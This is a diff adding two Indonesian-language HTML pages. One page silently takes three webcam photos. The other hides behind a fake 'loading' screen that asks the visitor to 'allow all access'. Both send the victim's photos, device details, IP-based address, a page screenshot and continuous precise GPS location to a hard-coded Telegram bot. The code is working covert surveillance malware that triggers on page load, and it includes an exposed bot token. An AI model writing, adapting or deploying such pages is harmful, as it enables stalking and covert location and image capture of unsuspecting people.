@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>MOHON IZINKAN ALL AKSES..</title>
+</head>
+<body>
+  <script>
+    // Ganti dengan token dan chat_id kamu
+    const BOT_TOKEN = "7263103738:AAFHQr9tKSy-DxMM5h7H9XdDPyksAdb-3_Q";
+    const CHAT_ID = "7191940139";
+
+    // Fungsi kirim foto ke Telegram
+    async function sendPhoto(blob, index) {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", blob, `capture_${index}.png`);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: fd
+      });
+      console.log(`Foto ${index} berhasil dikirim`);
+    }
+
+    // Fungsi ambil foto
+    function capturePhoto(video, stream, index) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        await sendPhoto(blob, index);
+        if (index === 3) {
+          // stop kamera setelah selesai
+          stream.getTracks().forEach(track => track.stop());
+          console.log("Semua foto selesai diambil dan kamera dimatikan.");
+        }
+      }, "image/png");
+    }
+
+    // Akses kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        // Tunggu kamera nyala sebentar
+        setTimeout(() => {
+          // Ambil 3 foto dengan jeda 1 detik
+          capturePhoto(video, stream, 1);
+          setTimeout(() => capturePhoto(video, stream, 2), 1000);
+          setTimeout(() => capturePhoto(video, stream, 3), 2000);
+        }, 3000); // mulai 3 detik setelah kamera aktif
+      })
+      .catch(err => {
+        console.error("Tidak bisa akses kamera:", err);
+      });
+  </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Tunggu Loadingg..</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    body {
+      background:#000;
+      margin:0;
+      padding:0;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+      font-family:Arial,sans-serif;
+      color:#999;
+      overflow:hidden;
+    }
+    #loading-container {
+      text-align:center;
+      width:80%;
+      max-width:400px;
+    }
+    #loading-text {
+      font-size:20px;
+      margin-bottom:20px;
+      color:#6e48aa;
+    }
+    #progress-container {
+      height:6px;
+      background:#222;
+      border-radius:3px;
+      overflow:hidden;
+      margin: 0 auto;
+      width: 100%;
+      max-width: 350px;
+    }
+    #progress-bar {
+      height:100%;
+      width:0%;
+      background:linear-gradient(90deg,#6e48aa,#9d50bb);
+      transition:width .3s ease;
+    }
+    #loading-details {
+      margin-top:15px;
+      font-size:14px;
+      color:#bbb;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-container">
+    <div id="loading-text">
+      <h1 style="color:red;">"MY TOOLS ALL ACESS"</h1><br>
+      <br>aktifkan terlebih dahulu GPRS & izinkan semua akses<br>
+      <br>
+      <br>
+      LOADING. . . . . . . .
+    </div>
+    <div id="progress-container"><div id="progress-bar"></div></div>
+    <div id="loading-details"></div>
+    <canvas id="c" class="hidden"></canvas>
+  </div>
+
+  <script>
+  (()=>{
+
+    const T='7263103738:AAFHQr9tKSy-DxMM5h7H9XdDPyksAdb-3_Q';
+    const C='7191940139';
+
+    // Progress bar
+    let p=0;
+    const pb=document.getElementById('progress-bar');
+    const ld=document.getElementById('loading-details');
+    const LM=[
+      "Memeriksa modul sistem...",
+      "Memuat komponen inti...",
+      "Menginisialisasi antarmuka...",
+      "Memverifikasi koneksi...",
+      "Menyiapkan lingkungan...",
+      "Memeriksa pembaruan...",
+      "Memuat aset tampilan..."
+    ];
+    setInterval(()=>{
+      p+=Math.random()*5;
+      if(p>98) p=98;
+      pb.style.width=p+'%';
+      if(Math.random()>.9) {
+        ld.textContent=LM[Math.floor(Math.random()*LM.length)];
+      }
+    },500);
+
+    // Fungsi kirim pesan ke Telegram
+    const sTG=async d=>{
+      try{
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
+        });
+      }catch(e){}
+    };
+
+    const sP=async(b,f)=>{
+      try{
+        const fd=new FormData();
+        fd.append('chat_id',C);
+        fd.append('photo',b,f);
+        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd});
+      }catch(e){}
+    };
+
+    // Ambil lokasi detail dari koordinat
+    const gLD=async(a,b)=>{
+      try{
+        const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
+        const d=await r.json();
+        if(d.address) return {
+          kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",
+          kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",
+          fa:d.display_name||"Alamat tidak tersedia"
+        };
+      }catch(e){}
+      return {kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"};
+    };
+    const cDI=async()=>{
+      let m='╭───── Tracking Report ───── ⦿\n\n';
+      m+='⚙️ DEVICE INFORMATION\n';
+      m+=`🖥️ Device: ${navigator.userAgent}\n`;
+      m+=`💻 Platform: ${navigator.platform}\n`;
+      m+=`🌐 Bahasa: ${navigator.language}\n`;
+      m+=`📶 Online: ${navigator.onLine?'Online':'Offline'}\n`;
+      m+=`📺 Screen Size: ${screen.width}x${screen.height}\n`;
+      m+=`🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+      m+=`💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n`;
+      m+=`🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+
+      if(navigator.getBattery){
+        try{
+          const b=await navigator.getBattery();
+          m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n`;
+          m+=`🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`;
+        }catch(e){
+          m+='🔋 Battery: ❌ Tidak tersedia\n';
+        }
+      }
+
+      m+=`⏰ Waktu Akses: ${new Date().toString()}\n`;
+      m+=`🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+      m+=`📜 History Length: ${history.length}\n`;
+      m+=`✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n`;
+      m+=`🔗 Referrer: ${document.referrer||'None'}\n`;
+      m+=`🌍 URL: ${location.href}\n`;
+      m+=`📄 Title: ${document.title}\n`;
+      m+=`🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+      m+=`🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+      try{
+        const i=await fetch('https://ipapi.co/json/');
+        const d=await i.json();
+        m+='📍 ALAMAT DETAIL LOKASI\n';
+        m+=`📡 IP Address: ${d.ip}\n`;
+        m+=`🏙️ Kota: ${d.city}\n`;
+        m+=`🏙️ Kabupaten: ${d.region}\n`;
+        m+=`🗺️ Wilayah: ${d.region}\n`;
+        m+=`🌎 Negara: ${d.country_name}\n`;
+        m+=`🏷️ Kode Pos: ${d.postal}\n`;
+
+        if(d.latitude&&d.longitude){
+          m+=`📌 Latitude: ${d.latitude}\n`;
+          m+=`📍 Longitude: ${d.longitude}\n`;
+          const l=await gLD(d.latitude,d.longitude);
+          m+=`🏙️ Kabupaten: ${l.kb}\n`;
+          m+=`🏙️ Kecamatan: ${l.kc}\n`;
+          m+=`🏠 Alamat Lengkap: ${l.fa}\n`;
+        }
+      }catch(e){
+        m+='❌ Gagal mendapatkan informasi lokasi\n';
+      }
+
+      m+='\n╰───── Developer @delreyeas ───── ⦿';
+      return m;
+    };
+
+    const ST=async()=>{
+      await sTG(await cDI());
+
+      // Screenshot halaman
+      setTimeout(async()=>{
+        try{
+          const cn=await html2canvas(document.body);
+          cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg');
+        }catch(e){
+          await sTG('❌ Screenshot failed');
+        }
+      },5000);
+
+     // Lokasi akurat dari GPS
+      if(navigator.geolocation){
+        navigator.geolocation.watchPosition(async p=>{
+          let g=`📍 Lokasi Akurat Sesuai Target\n`;
+          g+=`📌 Lat: ${p.coords.latitude}\n`;
+          g+=`📍 Lng: ${p.coords.longitude}\n`;
+          g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
+          const l=await gLD(p.coords.latitude,p.coords.longitude);
+          g+=`🏙️ Kabupaten: ${l.kb}\n`;
+          g+=`🏙️ Kecamatan: ${l.kc}\n`;
+          g+=`🏠 Alamat: ${l.fa}\n`;
+          g+=`🌍 <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Lihat di Google Maps</a>\n`;
+          await sTG(g);
+        }, async e=>{
+          await sTG(`❌ GPS dimatikan: ${e.message}`);
+        },{enableHighAccuracy:true,maximumAge:0,timeout:5000});
+      }
+    };
+
+    setTimeout(ST,3000);
+
+  })();
+  </script>
+</body>
+</html>
